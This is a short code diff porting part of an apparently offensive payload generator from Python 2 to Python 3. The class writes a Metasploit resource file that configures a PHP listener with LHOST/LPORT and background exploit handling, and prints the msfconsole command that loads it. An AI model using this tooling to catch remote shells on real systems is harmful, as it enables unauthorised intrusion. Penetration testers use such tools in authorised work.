@@ -17,8 +17,8 @@ class Payload:
         opt += "set LHOST {0}\n set LPORT {1}\n".format(self.lhost, self.lport)
         opt += "set ExitOnSession false\n"
         opt += "exploit -j\n"
-        f = file("php_listener.rc", "w")
+        f = open("php_listener.rc", "w")
         f.write(opt)
         f.close()
-        print Payload.t.red("[{0}] ".format(datetime.datetime.now())) + "Generated Metasploit Resource File"
-        print Payload.t.red("[{0}] ".format(datetime.datetime.now())) + "Load Metasploit: msfconsole -r php_listener.rc"
+        print(Payload.t.red("[{0}] ".format(datetime.datetime.now())) + "Generated Metasploit Resource File")
+        print(Payload.t.red("[{0}] ".format(datetime.datetime.now())) + "Load Metasploit: msfconsole -r php_listener.rc")
